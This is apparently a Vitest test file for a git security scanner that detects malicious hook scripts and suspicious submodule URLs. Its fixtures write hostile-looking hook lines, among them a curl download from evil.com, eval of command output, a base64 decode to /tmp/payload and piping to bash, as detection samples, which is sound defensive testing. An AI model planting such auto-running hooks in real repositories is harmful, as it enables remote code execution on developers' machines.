import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import { scanGitSecurity, GIT_HOOK_PATTERNS, GITMODULE_PATTERNS } from "../git-scanner.js";
import { matchPatternInContent } from "../patterns.js";

function normalizePatternMatches(
  content: string,
  matches: ReturnType<typeof matchPatternInContent>,
) {
  const lineStarts = [0];
  for (let index = 0; index < content.length; index++) {
    if (content[index] === "\n") lineStarts.push(index + 1);
  }

  return matches.map((hit) => {
    const matchIndex = hit.match.index ?? 0;
    const absoluteStart = hit.match.input === content
      ? matchIndex
      : (lineStarts[hit.line - 1] ?? 0) + matchIndex;
    return { line: hit.line, start: absoluteStart, evidence: hit.text };
  });
}

describe("Git Scanner", () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(process.env.TEMP ?? "/tmp", "scg-git-"));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  function createGitHook(hookName: string, content: string) {
    const hooksDir = path.join(tmpDir, ".git", "hooks");
    fs.mkdirSync(hooksDir, { recursive: true });
    fs.writeFileSync(path.join(hooksDir, hookName), content);
  }

  function createGitModules(content: string) {
    fs.writeFileSync(path.join(tmpDir, ".gitmodules"), content);
    // Also need .git dir to exist
    fs.mkdirSync(path.join(tmpDir, ".git"), { recursive: true });
  }

  it("should detect curl in git hooks", () => {
    createGitHook("post-merge", "#!/bin/sh\ncurl https://evil.com/payload.sh");
    const findings = scanGitSecurity(tmpDir);
    expect(findings.some((f) => f.rule === "GIT_HOOK_DOWNLOAD")).toBe(true);
  });

  it("should not flag a download command without a remote URL", () => {
    createGitHook("post-merge", "#!/bin/sh\ncurl ./local-payload.sh");
    const findings = scanGitSecurity(tmpDir);
    expect(findings.some((f) => f.rule === "GIT_HOOK_DOWNLOAD")).toBe(false);
  });

  it("does not bridge hook downloads across dot line terminators", () => {
    createGitHook("post-merge", "#!/bin/sh\ncurl payload\rhttps://evil.com/x");
    const findings = scanGitSecurity(tmpDir);
    expect(findings.some((f) => f.rule === "GIT_HOOK_DOWNLOAD")).toBe(false);
  });

  it("should detect eval in git hooks", () => {
    createGitHook("pre-commit", '#!/bin/sh\neval "$(some_command)"');
    const findings = scanGitSecurity(tmpDir);
    expect(findings.some((f) => f.rule === "GIT_HOOK_EXEC")).toBe(true);
  });

  it("should detect base64 in git hooks", () => {
    createGitHook("pre-push", '#!/bin/sh\necho "encoded" | base64 -d > /tmp/payload');
    const findings = scanGitSecurity(tmpDir);
    expect(findings.some((f) => f.rule === "GIT_HOOK_ENCODED")).toBe(true);
  });

  it("should detect pipe to shell in git hooks", () => {
    createGitHook("post-checkout", "#!/bin/sh\necho code | bash");
    const findings = scanGitSecurity(tmpDir);
    expect(findings.some((f) => f.rule === "GIT_HOOK_PIPE_SHELL")).toBe(true);
  });

  it("should skip .sample hooks", () => {
    createGitHook("pre-commit.sample", '#!/bin/sh\ncurl https://example.com');
    const findings = scanGitSecurity(tmpDir);
    expect(findings).toHaveLength(0);
  });

  it("should detect HTTP submodule URLs", () => {
    createGitModules('[submodule "lib"]\n\tpath = lib\n\turl = http://evil.com/lib.git');
    const findings = scanGitSecurity(tmpDir);
    expect(findings.some((f) => f.rule === "GIT_SUBMODULE_HTTP")).toBe(true);
  });

  it("should detect suspicious submodule URLs", () => {
    createGitModules('[submodule "lib"]\n\tpath = lib\n\turl = https://sketchy-host.ru/lib.git');
    const findings = scanGitSecurity(tmpDir);
    expect(findings.some((f) => f.rule === "GIT_SUBMODULE_SUSPICIOUS")).toBe(true);
  });

  it("should not flag github.com submodule URLs", () => {
    createGitModules('[submodule "lib"]\n\tpath = lib\n\turl = https://github.com/org/repo.git');
    const findings = scanGitSecurity(tmpDir);
    expect(findings.some((f) => f.rule === "GIT_SUBMODULE_SUSPICIOUS")).toBe(false);
  });

  it("should return empty for directory without .git", () => {
    const findings = scanGitSecurity(tmpDir);
    expect(findings).toHaveLength(0);
  });

  it("should include line numbers for hooks", () => {
    createGitHook("pre-commit", "#!/bin/sh\n# comment\ncurl https://evil.com/x");
    const findings = scanGitSecurity(tmpDir);
    expect(findings.find((f) => f.rule === "GIT_HOOK_DOWNLOAD")?.line).toBe(3);
  });

  it("matches the legacy regex verdict on hook download edge cases", () => {
    const structural = GIT_HOOK_PATTERNS.find(
      (entry) => entry.rule === "GIT_HOOK_DOWNLOAD",
    )!;
    const regex = { ...structural, correlatedMatcher: undefined };
    const cases = [
      "curl https://example.com/x",
      "FETCH  x HTTP://example.com",
      "curl x\rhttps://example.com/x",
      "curl x\u2028https://example.com/x",
      "curl x\u2029https://example.com/x",
      "curl \r https://example.com/x",
      "curl \u2028 https://example.com/x",
      "curl \u2029 https://example.com/x",
      "curl old curl \r y https://example.com/x",
      "curl old curl \u2028 y https://example.com/x",
      "curl old curl \u2029 y https://example.com/x",
      "curl first https://one.invalid x https://two.invalid",
      "curl first wget second https://one.invalid x https://two.invalid",
      "https://example.com/x curl local",
      "before\ncurl x https://one.invalid x https://two.invalid",
    ];

    for (const content of cases) {
      const expected = normalizePatternMatches(
        content,
        matchPatternInContent(regex, content, "i"),
      );
      const actual = normalizePatternMatches(
        content,
        matchPatternInContent(structural, content, "i"),
      );
      expect(actual, JSON.stringify(content)).toEqual(expected);
    }
  });

  it("fully scans a 5 MiB repeated download near miss in linear time", { timeout: 15_000 }, () => {
    const size = 5 * 1024 * 1024;
    const unit = "curl x";
    const content = unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
    const pattern = GIT_HOOK_PATTERNS.find(
      (entry) => entry.rule === "GIT_HOOK_DOWNLOAD",
    )!;
    const started = Date.now();
    const hits = matchPatternInContent(pattern, content, "i");

    expect(hits).toHaveLength(0);
    expect(hits.coverage.complete).toBe(true);
    expect(hits.coverage.regexAttempts).toBe(1);
    expect(Date.now() - started).toBeLessThan(5_000);
  });

  it("should have pattern arrays", () => {
    expect(GIT_HOOK_PATTERNS.length).toBeGreaterThan(2);
    expect(GITMODULE_PATTERNS.length).toBeGreaterThan(0);
  });
});
